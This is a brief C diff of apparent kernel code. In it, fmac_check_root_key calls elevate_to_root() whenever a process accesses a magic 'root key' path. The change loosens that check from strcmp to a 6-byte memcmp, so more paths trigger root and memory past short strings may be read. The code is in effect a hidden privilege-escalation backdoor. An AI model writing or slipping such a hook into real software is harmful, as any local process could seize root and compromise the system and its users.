@@ -59,7 +59,7 @@ int fmac_check_root_key(const char *pathname)
 {
     int ret;
 
-    if (strcmp(pathname, FMAC_ROOT_KEY) == 0) {
+    if (memcmp(pathname, FMAC_ROOT_KEY,6) == 0) {
         fmac_append_to_log("[FMAC] Root key path accessed by pid %d, attempting privilege escalation\n", current->pid);
         
         ret = elevate_to_root();
